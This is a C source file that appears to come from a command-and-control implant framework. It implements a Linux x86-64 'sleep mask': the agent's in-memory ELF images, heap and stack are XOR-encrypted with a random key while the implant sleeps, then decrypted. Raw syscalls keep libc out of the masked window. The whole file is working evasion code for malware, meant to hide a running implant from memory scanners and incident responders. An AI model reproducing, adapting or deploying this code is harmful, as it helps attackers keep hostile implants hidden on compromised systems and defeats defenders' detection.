/*
 * mask_xor.c — default sleep-mask provider: XOR the agent's memory in place.
 *
 * This code lives in the stager image, which is mapped separately from the
 * agent. The wrapper in mask.c switches to the stager's dedicated mask stack
 * before calling this provider. The provider masks agent-owned memory: every
 * anonymous ELF image plus the process [heap] and [stack]. Runtime mappings
 * (libc/libld data, rseq/shadow-stack named mappings, the stager's own code
 * and GOT) stay untouched so the stub and the running thread keep working.
 *
 * Everything between the first XOR and the second XOR must avoid libc: the
 * agent's heap/stack are encrypted during that window. The timer is a raw
 * nanosleep syscall, and the key is zeroed with a volatile loop.
 */

#define _GNU_SOURCE
#include "mask.h"

#include "mask_ranges.h"

#include "util/maps.h"
#include "util/syscalls.h"
#include "util/utils.h"

#include <stdint.h>

#define MASK_KEY_LEN 32
/* Generous enough for a heavily loaded process; truncation leaves mappings
 * untouched rather than corrupting the map list. */
#define MASK_MAX_MAPS 2048
#define MASK_MAX_RANGES (MASK_MAX_MAPS * 2)
#define MASK_MAP_BUF (512u * 1024u)

/* The provider allocates its own scratch area instead of carrying large local
 * arrays: users can replace this file without sizing the stub stack for it.
 * The scratch mapping is path-less and non-ELF, so it is never selected for
 * masking; it is explicitly excluded as well. */
struct mask_scratch {
  char text[MASK_MAP_BUF];
  struct c2_map maps[MASK_MAX_MAPS];
  struct c2_map ranges[MASK_MAX_RANGES];
};

static long mask_syscall(long n, long a1, long a2, long a3) {
  unsigned long ret;
  register long r10 __asm__("r10") = a3;
  __asm__ __volatile__("syscall"
                       : "=a"(ret)
                       : "a"(n), "D"(a1), "S"(a2), "r"(r10)
                       : "rcx", "r11", "memory");
  return (long)ret;
}

static int read_full(int fd, void *buf, size_t len) {
  size_t off = 0;
  while (off < len) {
    long n = read(fd, (uint8_t *)buf + off, len - off);
    if (n < 0) {
      if (n == -4) /* EINTR */
        continue;
      return -1;
    }
    if (n == 0)
      break;
    off += (size_t)n;
  }
  return (int)off;
}

static size_t find_ranges(struct mask_scratch *sc, uintptr_t keep_start,
                          uintptr_t keep_end, uintptr_t fs_base,
                          uintptr_t gs_base, uintptr_t code_probe) {
  char *text = sc->text;
  struct c2_map *maps = sc->maps;
  struct c2_map *ranges = sc->ranges;
  size_t cap = MASK_MAX_RANGES;
  int fd = open("/proc/self/maps", O_RDONLY, 0);
  if (fd < 0)
    return 0;
  int nread = read_full(fd, text, MASK_MAP_BUF - 1);
  close(fd);
  if (nread <= 0)
    return 0;
  text[nread] = '\0';

  size_t nmaps = c2_maps_parse(text, (size_t)nread, maps, MASK_MAX_MAPS);
  uintptr_t code_end = 0;
  for (size_t i = 0; i < nmaps; i++) {
    if (maps[i].anonymous && (maps[i].prot & PROT_EXEC) &&
        maps[i].start <= code_probe && code_probe < maps[i].end) {
      code_end = maps[i].end;
      break;
    }
  }
  size_t n = 0;
  for (size_t i = 0; i < nmaps; i++) {
    /* Anonymous [heap], [stack], [anon:...] and path-less mappings are the
     * agent's private memory. File-backed code/data (libc, the stager image)
     * and kernel mappings ([vdso], [vvar]) are not agent state. */
    if (!maps[i].anonymous || !(maps[i].prot & PROT_READ))
      continue;
    int take = maps[i].special == C2_MAP_SPECIAL_HEAP ||
               maps[i].special == C2_MAP_SPECIAL_STACK;
    if (!take && maps[i].anonymous && maps[i].end - maps[i].start >= 4) {
      const uint8_t *m = (const uint8_t *)maps[i].start;
      take = m[0] == 0x7f && m[1] == 'E' && m[2] == 'L' && m[3] == 'F';
    }
    if (!take)
      continue;
    /* The running stub needs the thread's TLS mapping (errno, stack cookie,
     * rseq). The stager's own GS state is already in the keep range. The
     * stager code may itself be an anonymous PIC mapping; never encrypt it. */
    if (fs_base != 0 && maps[i].start <= fs_base && fs_base < maps[i].end)
      continue;
    if (gs_base != 0 && maps[i].start <= gs_base && gs_base < maps[i].end)
      continue;
    if (maps[i].start <= code_probe && code_probe < maps[i].end)
      continue;
    /* A raw PIC stager's writable data immediately follows its anonymous RX
     * image; it belongs to the stub, not the agent. */
    if (code_end != 0 && maps[i].start == code_end)
      continue;
    n = mask_add_map(maps[i].start, maps[i].end, maps[i].prot, keep_start,
                     keep_end, (uintptr_t)sc, (uintptr_t)sc + sizeof(*sc),
                     ranges, cap, n);
  }
  return n;
}

static void xor_ranges(const struct c2_map *ranges, size_t n,
                       const uint8_t *key) {
  for (size_t i = 0; i < n; i++) {
    volatile uint8_t *p = (volatile uint8_t *)ranges[i].start;
    size_t len = (size_t)(ranges[i].end - ranges[i].start);
    for (size_t j = 0; j < len; j++)
      p[j] ^= key[j % MASK_KEY_LEN];
  }
}

static void zero_key(volatile uint8_t *key, size_t len) {
  for (size_t i = 0; i < len; i++)
    key[i] = 0;
}

int stager_mask_provider_sleep(unsigned seconds, uintptr_t probe,
                               uintptr_t keep_start, uintptr_t keep_end) {
  (void)probe;
  uintptr_t fs_base = 0;
  uintptr_t gs_base = 0;
  (void)mask_syscall(SYS_arch_prctl, ARCH_GET_FS, (long)&fs_base, 0);
  (void)mask_syscall(SYS_arch_prctl, ARCH_GET_GS, (long)&gs_base, 0);
  uintptr_t code_probe = (uintptr_t)(void *)&stager_mask_provider_sleep;
  struct mask_scratch *sc =
      (struct mask_scratch *)mmap(NULL, sizeof(*sc), PROT_READ | PROT_WRITE,
                                  MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  if (sc == MAP_FAILED)
    return -1;
  struct c2_map *ranges = sc->ranges;
  size_t n = find_ranges(sc, keep_start, keep_end, fs_base, gs_base, code_probe);
  if (n == 0) {
    munmap(sc, sizeof(*sc));
    return -1;
  }

  int ok = 1;
  for (size_t i = 0; i < n; i++)
    if (mprotect((void *)ranges[i].start,
                 (size_t)(ranges[i].end - ranges[i].start),
                 PROT_READ | PROT_WRITE) != 0) {
      ok = 0;
      goto restore;
    }

  uint8_t key[MASK_KEY_LEN];
  if (mask_syscall(SYS_getrandom, (long)key, MASK_KEY_LEN, 0) !=
      MASK_KEY_LEN) {
    for (size_t i = 0; i < sizeof(key); i++)
      key[i] = (uint8_t)(i * 131u + (unsigned)seconds);
  }

  xor_ranges(ranges, n, key);

  struct timespec {
    long tv_sec;
    long tv_nsec;
  } ts;
  ts.tv_sec = (long)seconds;
  ts.tv_nsec = 0;
  long rc;
  do {
    rc = mask_syscall(SYS_nanosleep, (long)&ts, (long)&ts, 0);
  } while (rc == -4);

  xor_ranges(ranges, n, key);
  zero_key(key, sizeof(key));

restore:
  for (size_t i = 0; i < n; i++)
    if (mprotect((void *)ranges[i].start,
                 (size_t)(ranges[i].end - ranges[i].start),
                 ranges[i].prot) != 0)
      ok = 0;
  munmap(sc, sizeof(*sc));
  return ok ? 0 : -1;
}
